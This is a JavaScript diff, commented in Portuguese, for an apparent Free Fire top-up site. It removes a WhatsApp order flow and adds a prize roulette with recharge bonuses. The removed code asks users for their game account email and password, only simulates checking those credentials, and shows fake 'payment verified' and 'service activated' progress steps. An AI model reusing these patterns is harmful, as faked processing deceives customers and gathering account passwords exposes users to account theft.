-      const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
-      
-      // Cria um link temporário
-      const link = document.createElement('a');
-      link.href = url;
-      link.target = '_blank';
-      link.rel = 'noopener noreferrer';
-      link.style.display = 'none';
-      document.body.appendChild(link);
-      
-      // Simula o clique do usuário
-      link.click();
-      
-      // Remove o link
-      document.body.removeChild(link);
-      
-      // Considera como sucesso
-      resolve(true);
-    } catch (error) {
-      console.error("Erro ao abrir WhatsApp:", error);
-      reject(new Error("Não foi possível abrir o WhatsApp. Por favor, clique no botão 'Conversar' na seção de contato."));
-    }
-  });
-}
-
-// Função de alerta melhorada
-function showAlert(message, type = "info") {
-  const alertDiv = document.createElement("div");
-  alertDiv.className = `custom-alert alert-${type}`;
-  alertDiv.textContent = message;
-  document.body.appendChild(alertDiv);
-  
-  setTimeout(() => {
-    alertDiv.remove();
-  }, 5000);
-}
-
-// Função para alternar visibilidade da senha
-function togglePassword() {
-  const senhaInput = document.getElementById('senha');
-  const toggleButton = document.querySelector('.toggle-password i');
-  
-  if (senhaInput.type === 'password') {
-    senhaInput.type = 'text';
-    toggleButton.className = 'fas fa-eye-slash';
+function finalizarRoleta() {
+  anguloAtual = anguloAtual % (2 * Math.PI);
+  const setor = totalSetores - Math.floor((anguloAtual / (2 * Math.PI)) * totalSetores) % totalSetores;
+  const resultado = setores[setor % totalSetores];
+  let mensagem = '';
+  let premio = '';
+  switch (resultado.texto) {
+    case '1': premio = '100$ Bônus na próxima recarga!'; break;
+    case '2': premio = 'Tente novamente!'; break;
+    case '3': premio = '50$ Bônus na próxima recarga!'; break;
+    case '4': premio = 'Tente novamente!'; break;
+    case '5': premio = '25$ Bônus na próxima recarga!'; break;
+    case '6': premio = 'Tente novamente!'; break;
+    default: premio = '';
+  }
+  if (premio !== 'Tente novamente!') {
+    mensagem = `<div style='background:#23272a;color:#ffd700;padding:16px 20px;border-radius:10px;max-width:350px;margin:18px auto 0 auto;font-size:1.1rem;'>🎉 Parabéns!<br>Você ganhou: <strong>${premio}</strong></div>`;
   } else {
-    senhaInput.type = 'password';
-    toggleButton.className = 'fas fa-eye';
+    mensagem = `<div style='background:#23272a;color:#fff;padding:16px 20px;border-radius:10px;max-width:350px;margin:18px auto 0 auto;font-size:1.1rem;'>Não foi dessa vez.<br><strong>Tente novamente!</strong></div>`;
   }
+  resultadoRoleta.innerHTML = mensagem;
+  girando = false;
 }
-
-// Função para mascarar senha na mensagem
-function maskPassword(password) {
-  return '•'.repeat(password.length);
+if (roletaCanvas) desenharRoleta();
+if (girarBtn) {
+  girarBtn.onclick = girarRoletaAnimado;
 }
-
-// Validação de senha
-function validatePassword(password) {
-  return password.length >= 6; // Senha deve ter pelo menos 6 caracteres
-}
-
-// Funções para o processo automático
-function showProcessModal() {
-    const modal = document.getElementById('processModal');
-    if (modal) {
-        modal.classList.add('active');
-    }
-}
-
-function hideProcessModal() {
-    const modal = document.getElementById('processModal');
-    if (modal) {
-        modal.classList.remove('active');
-    }
-}
-
-async function simulateAutomatedProcess() {
-    try {
-        const steps = document.querySelectorAll('.progress-step');
-        const processMessage = document.querySelector('.process-message');
-        if (!steps.length || !processMessage) {
-            console.error('Elementos do modal não encontrados');
-            return;
-        }
-
-        const messages = [
-            "Verificando pagamento...",
-            "Validando dados da conta...",
-            "Iniciando serviço...",
-            "Serviço ativado com sucesso!"
-        ];
-
-        for (let i = 0; i < steps.length; i++) {
-            // Atualiza o passo atual
-            steps[i].classList.add('active');
-            processMessage.textContent = messages[i];
-
-            // Aguarda um tempo para simular o processamento
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Marca o passo como concluído
-            steps[i].classList.add('done');
-        }
-
-        // Aguarda um momento final para mostrar o sucesso
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        showAlert("✅ Serviço ativado com sucesso!", "success");
-        hideProcessModal();
-    } catch (error) {
-        console.error('Erro no processo automático:', error);
-        hideProcessModal();
-        showAlert("❌ Erro ao processar pedido. Tente novamente.", "error");
-    }
-}
-
-// Função para mascarar email no histórico
-function maskEmail(email) {
-    return email.replace(/(.{2})(.*)(@.*)/, '$1***$3');
-}
-
-// Função para validar a conta Free Fire
-async function validateAccount(email, senha) {
-  try {
-    showAlert("⌛ Verificando credenciais da conta...", "info");
-    
-    // Simulando verificação de conta (pode ser substituído por uma API real)
-    const response = await new Promise((resolve) => {
-      setTimeout(() => {
-        // Simulação de validação básica
-        const accountValid = email.length > 0 && senha.length >= 6;
-        resolve({
-          success: accountValid,
-          message: accountValid ? 
-            "Conta verificada com sucesso!" : 
-            "Não foi possível verificar a conta. Verifique suas credenciais."
-        });
-      }, 2000); // Simula delay de rede
-    });
-
-    if (response.success) {
-      showAlert("✅ " + response.message, "success");
-      return true;
-    } else {
-      showAlert("❌ " + response.message, "error");
-      return false;
-    }
-  } catch (error) {
-    console.error("Erro na verificação da conta:", error);
-    showAlert("❌ Erro ao verificar a conta. Tente novamente.", "error");
-    return false;
-  }
-}
-
-// Formata o número do WhatsApp automaticamente
-document.getElementById('whatsapp').addEventListener('input', function(e) {
-    let numero = e.target.value.replace(/\D/g, '');
-    if (numero.length > 0) {
-        // Se começar com 238, mantém
-        if (numero.startsWith('238')) {
-            numero = numero.slice(0, 11);
-        } 
-        // Se não começar com 238, adiciona
-        else {
-            numero = '238' + numero;
-            numero = numero.slice(0, 11);
-        }
-        
-        // Formata o número
-        if (numero.length > 3) {
-            numero = `+${numero.slice(0, 3)} ${numero.slice(3)}`;
-        }
-    }
-    e.target.value = numero;
-});
